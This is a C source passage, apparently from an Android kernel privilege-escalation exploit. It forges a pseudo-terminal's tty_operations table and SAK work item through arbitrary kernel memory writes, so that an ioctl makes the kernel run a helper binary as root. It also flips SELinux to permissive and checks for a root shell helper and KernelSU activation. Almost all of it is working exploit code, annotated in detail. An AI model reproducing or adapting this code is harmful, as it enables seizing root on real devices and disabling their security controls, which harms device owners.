   * translating the address at all was.
   *
   * pipe_phys_read_data() cannot be used for this: it explicitly rejects anything failing
   * is_direct_ptr(), which is correct - it drives the forged pipe_buffer and therefore needs a
   * real direct-map address. kernel_read_data() is the raw-VA read. */
  rmg_diag("ROOT pty resolved tty=%016llx ops=%016llx port=%016llx\n",
           (unsigned long long)object->tty, (unsigned long long)object->original_ops,
           (unsigned long long)port);

  if (kernel_read_data(fd, (uintptr_t)object->original_ops, object->original_ops_table,
                       sizeof(object->original_ops_table)) !=
      (ssize_t)sizeof(object->original_ops_table)) {
    rmg_diag("ROOT pty ops read failed ops=%016llx errno=%d\n",
             (unsigned long long)object->original_ops, errno);
    return 0;
  }
  /* Validate the copied ops table. A mis-targeted read would otherwise be silently memcpy'd
   * into our staged table and published as a live tty's ops - where the first ioctl
   * dereferences it. Every legitimate tty_operations function pointer is kernel text. */
  if (!tty_ops_table_is_plausible(object->original_ops_table, port)) {
    rmg_diag("ROOT pty ops table is not a valid tty_operations - refusing to publish\n");
    return 0;
  }

  if (!pipe_phys_read_data(fd, object->tty + TTY_SAK_WORK_OFF, object->original_tail,
                           sizeof(object->original_tail))) {
    rmg_diag("ROOT pty tail readback failed\n");
    return 0;
  }


  /* The borrowed work_struct must be IDLE and self-linked, or another work item may be in
   * flight and we would be corrupting it. This is the positive check that proves we are
   * looking at a real tty SAK work and not a coincidence. */
  uint64_t work_data = load_u64(object->original_tail, WORK_DATA_OFF);
  uint64_t entry_addr = (uint64_t)(object->tty + TTY_SAK_WORK_OFF) + WORK_ENTRY_OFF;
  uint64_t entry_next = load_u64(object->original_tail, WORK_ENTRY_OFF);
  uint64_t entry_prev = load_u64(object->original_tail, WORK_ENTRY_OFF + sizeof(uint64_t));
  uint64_t work_func = load_u64(object->original_tail, WORK_FUNC_OFF);
  uint64_t want_func = (uint64_t)text_addr(DO_SAK_WORK);
  rmg_diag("ROOT pty SAK work data=%016llx entry=%016llx/%016llx func=%016llx "
           "want_func=%016llx\n",
           (unsigned long long)work_data, (unsigned long long)entry_next,
           (unsigned long long)entry_prev, (unsigned long long)work_func,
           (unsigned long long)want_func);
  if ((work_data & WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
      entry_prev != entry_addr || work_func != want_func) {
    rmg_diag("ROOT pty SAK work rejected (not idle/self-linked/expected func)\n");
    return 0;
  }
  return 1;
}

static int restore_tty_object(int fd, const struct tty_kernel_object *object,
                              int restore_ops, int restore_tail) {
  int ok = 1;
  if (restore_ops &&
      !pipe_write64(fd, object->tty + TTY_OPS_OFF, object->original_ops)) {
    ok = 0;
  }
  if (restore_tail &&
      !pipe_phys_write_data(fd, object->tty + TTY_SAK_WORK_OFF, object->original_tail,
                            sizeof(object->original_tail))) {
    ok = 0;
  }
  if (!ok) {
    return 0;
  }
  /* Verify the restore actually landed - a silently misdirected write here would leave a
   * live tty pointing at our forged ops table. */
  uint64_t ops = 0;
  uint8_t tail[UMH_SUBPROCESS_INFO_SIZE];
  if (restore_ops &&
      (!pipe_phys_read64(fd, object->tty + TTY_OPS_OFF, &ops) ||
       ops != object->original_ops)) {
    return 0;
  }
  if (restore_tail &&
      (!pipe_phys_read_data(fd, object->tty + TTY_SAK_WORK_OFF, tail, sizeof(tail)) ||
       memcmp(tail, object->original_tail, sizeof(tail)) != 0)) {
    return 0;
  }
  return 1;
}

static int install_pty_umh_root(int fd, const char *root_umh_path) {
  struct private_pty pty;
  struct tty_kernel_object tty_object;
  struct umh_kernel_data umh_data;
  struct umh_subprocess_info fake;
  uint8_t fake_ops[TTY_OPS_SIZE];
  uint8_t original_selinux = 1;
  int selinux_changed = 0;
  int ops_published = 0;
  int tail_published = 0;
  int work_may_be_queued = 0;
  int safe_to_close = 0;
  int result = 0;

  if (!open_private_pty(&pty)) {
    rmg_diag("ROOT pty open failed errno=%d\n", errno);
    close_private_pty(&pty);
    return 0;
  }
  rmg_diag("ROOT pty opened master=%d slave=%d name=%s\n", pty.master, pty.slave,
           pty.slave_name);
  if (!resolve_tty_object(fd, pty.slave, &tty_object)) {
    rmg_diag("ROOT pty kernel object resolution FAILED\n");
    close_private_pty(&pty);
    return 0;
  }

  memset(&umh_data, 0, sizeof(umh_data));
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    rmg_diag("ROOT pty helper path too long\n");
    close_private_pty(&pty);
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  uintptr_t completion_addr = umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr = completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr = umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr = umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr = umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr = umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr = umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  /* Build the forged tail. Only the 0x30-byte work_struct is copied from the live tty - the
   * subprocess_info tail (complete/path/argv/envp/wait/...) lives at tty+0x328..0x368, and
   * tty_struct is only 0x340, so 40 of those 112 bytes fall PAST the allocation.
   *
   * Two things follow, and both matter:
   *  - The workqueue's container_of(work, subprocess_info, work) makes tty+0x2f8 the
   *    mandatory address of the struct, so we cannot stage it elsewhere. Upstream performs
   *    the identical 112-byte read/write on a tty_struct with the same 0x340 layout.
   *  - Whatever we leave in those 40 bytes must therefore be DETERMINISTIC, not whatever
   *    happened to be adjacent. So zero the whole struct and copy in only the work_struct.
   *    Copying all 112 bytes back out of the live tty would propagate uninitialised slab
   *    contents into the kernel's subprocess_info. */
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work, tty_object.original_tail, UMH_SUBPROCESS_WORK_SIZE);
  store_u64(fake.work, WORK_FUNC_OFF, text_addr(CALL_USERMODEHELPER_EXEC_WORK));
  /* `complete` MUST stay a valid, non-NULL pointer. It is load-bearing for memory safety,
   * not a formality: umh_complete() (kernel/umh.c:53-65) does
   *     comp = xchg(&sub_info->complete, NULL);
   *     if (comp) complete(comp); else call_usermodehelper_freeinfo(sub_info);
   * and the else branch runs kfree(sub_info). Our sub_info is not an allocation - it is
   * embedded at tty+0x2f8 - so a NULL `complete` would turn an exec failure into
   * kfree(tty + 0x2f8), i.e. kfree() on an interior pointer of the tty_struct slab object:
   * SLUB would push it onto that cache's freelist at object+offset, corrupting the cache
   * counter and producing a page-level UAF when the real tty is freed. Never "fix" this to 0
   * just to mirror a literal UMH_NO_WAIT.
   *
   * `complete` also aliases tty->port (tty+0x328). Do NOT write the real port pointer back
   * there mid-flight: the exec-failure path would then xchg/complete() a live struct
   * tty_port. Leave the staged completion in place and restore all 112 bytes atomically at
   * the end instead. Nothing on the TCOFLUSH path dereferences tty->port, and close() is
   * never reached while the forge is live (we pin the fds instead). */
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;
  fake.wait = 0;
  fake.retval = 0;
  fake.init = 0;
  fake.cleanup = 0;
  fake.data = 0;

  memcpy(fake_ops, tty_object.original_ops_table, sizeof(fake_ops));
  store_u64(fake_ops, TTY_OPS_FLUSH_BUFFER_OFF, text_addr(DO_SAK));

  uintptr_t fake_ops_addr = page_base + ROOT_TTY_OPS_LIVE_OFF;

  /* selinux_state.enforcing is a kernel-IMAGE address, so - exactly like tty->ops - it is
   * read with the raw-VA reader and not through a direct-map alias. The original failure here
   * (errno=13 on selinux=ffffffc00ae3e5c0) was pipe_phys_read_data() refusing a non-direct
   * address, not a bad mapping.
   *
   * Relaxing the enforcement is a BEST-EFFORT convenience for the helper, not a precondition
   * for the exploit: the trigger and the UMH exec do not depend on it. So a failure here is
   * logged and skipped rather than aborting the stage - the whole point of this rewrite is to
   * stop a cosmetic side effect from masking whether the queueing technique works. */
  const uintptr_t selinux_img = text_addr(SELINUX_ENFORCING);
  rmg_diag("ROOT pty staging work=%016llx data=%016zx ops=%016zx selinux_img=%016llx\n",
           (unsigned long long)(tty_object.tty + TTY_SAK_WORK_OFF), umh_data_addr,
           fake_ops_addr, (unsigned long long)selinux_img);

  unlink(ROOT_SOCKET_PATH);
  /* The activation log is O_APPEND and lives in /data/local/tmp, so it SURVIVES reboots. A
   * previous boot's trailing "[activate] done" would make root_activation_done() true before
   * this run even execs the helper, so drop it here and judge this run only. The helper
   * recreates it as root. */
  unlink(ROOT_ACTIVATE_LOG_PATH);
  int selinux_known = 0;
  if (kernel_read_data(fd, selinux_img, &original_selinux, sizeof(original_selinux)) ==
          (ssize_t)sizeof(original_selinux) &&
      original_selinux <= 1) {
    selinux_known = 1;
    rmg_diag("ROOT pty selinux enforcing=%u (getenforce reports the live truth)\n",
             original_selinux);
  } else {
    rmg_diag("ROOT pty selinux read failed img=%016llx val=%u errno=%d (continuing)\n",
             (unsigned long long)selinux_img, original_selinux, errno);
  }
  if (!pipe_phys_write_data(fd, umh_data_addr, &umh_data, sizeof(umh_data))) {
    rmg_diag("ROOT pty umh data write failed addr=%016zx errno=%d\n", umh_data_addr, errno);
    close_private_pty(&pty);
    return 0;
  }
  if (!pipe_phys_write_data(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
    rmg_diag("ROOT pty ops write failed addr=%016zx errno=%d\n", fake_ops_addr, errno);
    close_private_pty(&pty);
    return 0;
  }
  rmg_diag("ROOT pty staged, publishing tail then ops\n");

  tail_published = 1;
  if (!pipe_phys_write_data(fd, tty_object.tty + TTY_SAK_WORK_OFF, &fake, sizeof(fake))) {
    rmg_diag("ROOT pty subprocess publish FAILED\n");
    goto out;
  }
  ops_published = 1;
  if (!pipe_write64(fd, tty_object.tty + TTY_OPS_OFF, fake_ops_addr)) {
    rmg_diag("ROOT pty ops publish FAILED\n");
    goto out;
  }
  rmg_diag("ROOT pty published tty=%016llx; dropping selinux\n",
           (unsigned long long)tty_object.tty);

  uint8_t permissive = 0;
  uint8_t selinux_readback = 0xff;
  selinux_changed = 0;
  /* Best effort, and never fatal: see the comment at the read. A failure here means the
   * helper may be constrained by SELinux, which the socket poll will report honestly, rather
   * than an abort that tells us nothing about the queueing technique. */
  if (selinux_known && original_selinux != permissive) {
    selinux_changed = 1;
    if (kernel_write_data(fd, selinux_img, &permissive, sizeof(permissive)) !=
            (ssize_t)sizeof(permissive) ||
        kernel_read_data(fd, selinux_img, &selinux_readback,
                         sizeof(selinux_readback)) != (ssize_t)sizeof(selinux_readback) ||
        selinux_readback != permissive) {
      rmg_diag("ROOT pty selinux relax failed img=%016llx got=%u errno=%d (continuing)\n",
               (unsigned long long)selinux_img, selinux_readback, errno);
      selinux_changed = 0;
    }
  }

  /* THE TRIGGER. One genuine ioctl: the kernel walks tty->ops->flush_buffer, which is now
   * do_SAK, which does schedule_work(&tty->SAK_work) on our borrowed work_struct. */
  errno = 0;
  int ioctl_result = ioctl(pty.slave, TCFLSH, TCOFLUSH);
  int ioctl_error = ioctl_result == 0 ? 0 : errno;
  work_may_be_queued = ioctl_result == 0;
  rmg_diag("ROOT pty ioctl TCFLSH ret=%d errno=%d queued=%d\n", ioctl_result, ioctl_error,
           work_may_be_queued);

  int ops_restored = restore_tty_object(fd, &tty_object, 1, 0);
  if (ops_restored) {
    ops_published = 0;
  }
  if (ioctl_result != 0 || !ops_restored) {
    rmg_diag("ROOT pty queue failed ioctl=%d ops_restore=%d\n", ioctl_result, ops_restored);
    if (ioctl_result != 0 && ops_restored &&
        restore_tty_object(fd, &tty_object, 0, 1)) {
      tail_published = 0;
      safe_to_close = 1;
    }
    goto out;
  }

  /* `done` is a FAILURE flag, not a success flag.
   *
   * umh_complete() is only reached from the failure tail of
   * call_usermodehelper_exec_work (kernel/umh.c:120-126), i.e. after kernel_execve
   * RETURNS. A successful execve never returns - the calling task becomes the helper - so
   * on success the kernel never runs umh.c:120-129 and `done` stays 0 forever.
   *
   * Gating the socket check on `done` therefore made BOTH outcomes report failure: success
   * spun 5s and skipped the socket probe entirely, failure set done=1 and then probed for a
   * socket that will never exist. The root helper binding its unix socket is the only
   * trustworthy success signal, so poll that unconditionally.
   *
   * Budget: the helper now performs the KernelSU activation in-process BEFORE it binds the
   * socket (su_daemon.c umh_main), so "socket appeared" means "root AND activation done".
   * Activation shells out to ksud and is not instant, so 5s was no longer enough - a timeout
   * here would skip the tail restore and pin the PTY for no good reason. 30s instead, and
   * "[activate] done" in the activation log counts as success on its own, so the wait does
   * not depend on the socket bind surviving. */
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int activated_ok = 0;
  int creds_ok = 0;
  for (int i = 0; i < 3000; i++) {
    /* PRIMARY success signal: the helper's own creds report. It is a real file, written by a
     * real uid-0 process, containing its actual getuid/geteuid. Measured: the exec DOES
     * succeed and the helper DOES run even on runs where `done` read 1 - because our staging
     * page is reclaimable, so the helper's own allocations can land in it and flip the
     * completion byte we poll. A reclaimed-page flag is not a verdict; a root-owned file
     * written by the helper is. */
    if (!creds_ok) {
      uint32_t seen_uid = 0xffffffff;
      if (read_root_creds_uid(&seen_uid) && seen_uid == 0) {
        creds_ok = 1;
      }
    }
    if (!socket_ok && root_socket_ready()) {
      socket_ok = 1;
    }
    if (!activated_ok && root_activation_done()) {
      activated_ok = 1;
    }
    if (creds_ok || socket_ok || activated_ok) {
      break;
    }
    /* `done` is only a hint now, never a decision input, and never a break condition: it
     * lives in a page the kernel is free to recycle. Kept for the log line. */
    if ((i & 0x1f) == 0) {
      if (!pipe_phys_read32(fd, completion_addr, &complete_done)) {
        complete_done = 0;
      }
    }
    usleep(10000);
  }
  int exec_errno = 0;
  if (!creds_ok && !socket_ok && !activated_ok) {
    /* Dump what the KERNEL actually sees in the borrowed tail, instead of guessing. One
     * guarded read of the whole 112 bytes gives us, in one shot:
     *   +0x30 complete  the completion's `done` flag we already poll
     *   +0x38 path      pointer the kernel will deref for the helper binary
     *   +0x40 argv / +0x48 envp  the pointer arrays it will walk
     *   +0x54 retval    umh.c:120 writes the execve errno here on the failure path
     * Comparing path/argv/envp against what we staged distinguishes the two very different
     * failure modes we cannot otherwise tell apart:
     *   - pointers already clobbered  => our staging page was reclaimed/reused under us
     *   - pointers intact, retval set => execve really failed, and retval is the reason
     * The old code read only `retval` and printed 0, which is consistent with BOTH, so it
     * never actually told us anything. */
    uint8_t seen[UMH_SUBPROCESS_INFO_SIZE];
    memset(seen, 0, sizeof(seen));
    int seen_ok = pipe_phys_read_data(fd, tty_object.tty + TTY_SAK_WORK_OFF, seen,
                                      sizeof(seen));
    uint64_t want_path = path_addr;
    uint64_t want_argv = argv_addr;
    uint64_t want_envp = envp_addr;
    uint64_t got_complete = load_u64(seen, 0x30);
    uint64_t got_path = load_u64(seen, 0x38);
    uint64_t got_argv = load_u64(seen, 0x40);
    uint64_t got_envp = load_u64(seen, 0x48);
    int32_t got_retval = (int32_t)(uint32_t)load_u64(seen, 0x54);
    rmg_diag("ROOT pty tail dump read=%d complete=%016llx path=%016llx(want %016llx) "
             "argv=%016llx(want %016llx) envp=%016llx(want %016llx) retval=%d\n",
             seen_ok, (unsigned long long)got_complete, (unsigned long long)got_path,
             (unsigned long long)want_path, (unsigned long long)got_argv,
             (unsigned long long)want_argv,
             (unsigned long long)got_envp, (unsigned long long)want_envp,
             (int)got_retval);
    rmg_diag("ROOT pty staging match path=%d argv=%d envp=%d\n",
             got_path == (uint64_t)want_path, got_argv == (uint64_t)want_argv,
             got_envp == (uint64_t)want_envp);
    /* The pointers being intact only proves the tty copy is intact. execve dereferences
     * path/argv/envp, which point into our RECLAIMED staging page. If that page has been
     * recycled, the pointer is still correct but the string it names is garbage, and
     * execve fails with ENOENT/EFAULT while `complete` gets NULLed by umh_complete - exactly
     * what we observe with retval reading 0. So dump what the kernel would actually read. */
    {
      char path_buf[80];
      memset(path_buf, 0, sizeof(path_buf));
      int path_ok = pipe_phys_read_data(fd, (uintptr_t)got_path, path_buf, 64);
      uint64_t argv0 = 0;
      int argv_ok = pipe_phys_read64(fd, (uintptr_t)got_argv, &argv0);
      rmg_diag("ROOT pty target dump path_read=%d path=\"%s\" argv_read=%d argv0=%016llx\n",
               path_ok, path_buf, argv_ok, (unsigned long long)argv0);
    }
    exec_errno = (int)got_retval;
  }
  rmg_diag("ROOT pty result creds=%d socket=%d activated=%d done=%u exec_errno=%d\n", creds_ok, socket_ok,
           activated_ok, complete_done, exec_errno);

  /* The tail can only be restored once the work is no longer referenced. If the exec
   * succeeded the kernel has exec'd away from the borrowed memory; if it failed the work is
   * already complete. Either way it is safe now, so restore unconditionally rather than
   * only on the success flag. */
 /* Restore the borrowed tail ONLY once we have proof the work finished.
   *
   * If the poll loop above expired with neither the helper socket nor `complete` set, the
   * work item may still be linked into pool->worklist. Restoring the original self-linked
   * idle work_struct in that state would leave the (still queued) entry.next/prev pointing at
   * itself inside the pool's worklist - silent pool corruption, not a crash. So fail closed
   * and pin the PTY instead.
   *
   * Both success signals are sound here:
   *   socket_ok / activated_ok -> execve replaced the task, and the last read of our
   *                 sub_info (umh.c:116-118 path/argv/envp) happened strictly before that.
   *   done        -> umh_complete() already ran and returned.
   * In both cases the kworker has also finished: process_one_work() writes nothing back into
   * the work_struct after worker->current_func() returns (it keeps a local lockdep copy at
   * workqueue.c:2236 precisely so the struct may be freed inside the func), and the final
   * writes to the entry happen at workqueue.c:2269/2296, before the func is invoked. */
  int helper_ok = creds_ok || socket_ok || activated_ok;
  int work_done = helper_ok || complete_done;
  if (work_done && restore_tty_object(fd, &tty_object, 0, 1)) {
    tail_published = 0;
    safe_to_close = 1;
  } else if (!work_done) {
    rmg_diag("ROOT pty tail NOT restored: work may still be queued (creds=%d done=%u)\n",
             creds_ok, complete_done);
  }
  rmg_diag("ROOT pty result creds=%d socket=%d activated=%d done=%u restore=%d tty=%016llx\n",
           creds_ok, socket_ok, activated_ok, complete_done, !tail_published,
           (unsigned long long)tty_object.tty);
  result = helper_ok && !tail_published;

out:
  if (ops_published && restore_tty_object(fd, &tty_object, 1, 0)) {
    ops_published = 0;
  }
  if (tail_published && !work_may_be_queued &&
      restore_tty_object(fd, &tty_object, 0, 1)) {
    tail_published = 0;
  }
  if (!tail_published) {
    safe_to_close = 1;
  }
  if (!result && selinux_changed) {
    int restored = (int)kernel_write_data(fd, selinux_img, &original_selinux,
                                          sizeof(original_selinux));
    rmg_diag("ROOT pty selinux restore=%d old=%u\n", restored, original_selinux);
  }
  if (safe_to_close && !ops_published) {
    close_private_pty(&pty);
  } else {
    /* Leave the PTY open: closing it would free the tty while it still points at our
     * forged ops table. Pinning the fd is the safe failure. */
    rmg_diag("ROOT pty PINNED fds=%d/%d ops=%d tail=%d\n", pty.master, pty.slave,
             ops_published, tail_published);
  }
  return result;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
  /* rmg_diag, not pr_info. The root stage previously produced NO output at all on device:
   * it entered, issued ~11 pipe operations, and vanished. pr_info's sink had already
   * stopped at the fops checkpoint, so there was no evidence of where it stopped. rmg_diag
   * fsyncs to /data/local/tmp/rmg-diag.log and survives a crash, so these markers bracket
   * each phase of the root stage. */
  rmg_diag("ROOT stage enter uid=%u fd=%d\n", root_uid_before, fd);

  /* Resolve the helper path up front; both stages want it. */
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    rmg_diag("ROOT helper path missing/invalid (CVE43499_ROOT_HELPER)\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif

  /* Prefer the PTY/SAK path: it lets the kernel perform the workqueue queueing, which is
   * the only way the borrowed work_struct can ever be picked up. The legacy
   * hand-rolled-injection stage is kept as a fallback so behaviour is strictly additive. */
  int installed = install_pty_umh_root(fd, root_umh_path);
  if (!installed) {
    rmg_diag("ROOT pty stage failed; trying legacy workqueue injection\n");
    installed = install_workqueue_umh_root(fd);
  } else {
    /* The PTY stage must publish the same globals the legacy path does, or main.c's
     * `exploit_ok = cfi_stage_done && root_child_done` can never become true and a fully
     * successful PTY root would still report failure.
     *
     * root_uid_after is read back from the helper's own credentials file rather than being
     * asserted as 0. The helper (su_daemon.c umh_main) only reaches daemon_main() after
     * getuid()==geteuid()==getgid()==getegid()==0, and it writes the values it actually
     * holds to ROOT_CREDS_SENTINEL. A missing or non-zero file therefore fails closed
     * instead of claiming a root that was never measured. */
    uint32_t measured_uid = 0xffffffff;
    if (read_root_creds_uid(&measured_uid) && measured_uid == 0) {
      root_child_done = 1;
      root_uid_after = measured_uid;
      rmg_diag("ROOT pty stage SUCCEEDED uid_after=%u (measured)\n", measured_uid);
    } else {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      rmg_diag("ROOT pty socket appeared but creds unverified measured_uid=%u\n",
               measured_uid);
    }
  }
  rmg_diag("ROOT stage exit installed=%d\n", installed);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_ROOT_REF_HOLDER_REQUIRED) && \
    !APP_ROOT_REF_HOLDER_REQUIRED
  if (installed) {
    pr_info("root reference holder not required by target route\n");
  }
#else
#if defined(QEMU_FORCED_SLIDE_TEST) && QEMU_FORCED_SLIDE_TEST
  if (installed) {
    pr_info("root p0 reference holder not required for qemu forced slide\n");
  }
#else
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
#endif
#endif
  return installed;
}
